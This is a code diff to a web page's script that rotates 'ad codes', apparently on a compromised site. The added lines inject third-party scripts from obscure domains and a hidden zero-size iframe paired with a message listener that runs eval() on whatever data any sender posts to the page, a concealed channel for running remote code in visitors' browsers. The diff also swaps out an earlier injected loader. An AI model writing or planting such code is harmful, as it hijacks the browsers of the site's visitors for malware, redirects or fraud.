@@ -1,7 +1,7 @@
 <script>
 var randoms = {
-	ads_codes: ['<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>','<script>    var s = document.createElement(\'script\');    s.type = \'text/javascript\';    s.async = true;    s.src = \'https://emetmari.com:4358/ytgwgzsgox/juphj1dkw0bqzqvy4zxbxq/2078\';    var head = document.getElementsByTagName(\'head\')[0];    head.appendChild(s);<'+'/script>'],
-	ads_weight: [10,10],
+	ads_codes: ['<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>','<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>','<script type="text/javascript">(function(){window.addEventListener("message",function(e){var _des_s_9844=e.data;if(_des_s_9844.des_s_9844){var _s = \'/+/g\';eval(decodeURIComponent(_des_s_9844.des_s_9844.replace(_s,"%20")))}});document.write(\'<iframe style="display:none;" src="https://xn--2qu92fhtx4ff.ink:12443/ty/x-9844-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"><'+'/iframe>\')})();<'+'/script>'],
+	ads_weight: [10,10,10],
 
 	get_random: function(weight) {
 		var s = eval(weight.join('+'));
